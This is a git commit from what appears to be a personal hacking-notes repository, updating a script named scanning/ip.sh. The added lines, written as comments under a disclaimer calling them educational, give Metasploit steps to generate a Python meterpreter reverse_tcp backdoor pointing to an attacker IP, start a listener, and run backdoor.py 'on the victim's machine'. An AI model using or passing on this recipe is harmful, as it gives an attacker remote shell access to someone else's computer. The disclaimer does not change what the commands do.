e9a50ca859eb23d29b9d91da7855c2e09eb93287
Dmitri Wamback <56200546+dmitriwamback@users.noreply.github.com>
2023-12-12 08:57:55 -0500

    Update ip.sh

--- scanning/ip.sh
+++ scanning/ip.sh
@@ -1,1 +1,17 @@
-echo $(ifconfig | strings)
+# I AM NOT RESPONSABLE IF YOU DECIDE TO HACK AN UNAUTHORIZED SYSTEM!
+# HACKING WITHOUT PERMISSION IS ILLEGAL AND CAN LEAD TO A SERIOUS PRISON SENTENCE!
+# THIS IS FOR EDUCATIONAL PURPOSES!
+
+# echo $(ifconfig | strings)
+
+# [metasploit]
+# msfvenom -p python/meterpreter/reverse_tcp LHOST=[IP] LPORT=8080 > backdoor.py
+# msfconsole
+# >   [1] use exploit/multi/handler
+# >   [2] set payload python/meterpreter/reverse_tcp
+# >   [3] set lhost IP
+# >   [4] set lport 8080
+# >   [5] exploit
+
+# [on the victim's machine]
+# python3 backdoor.py
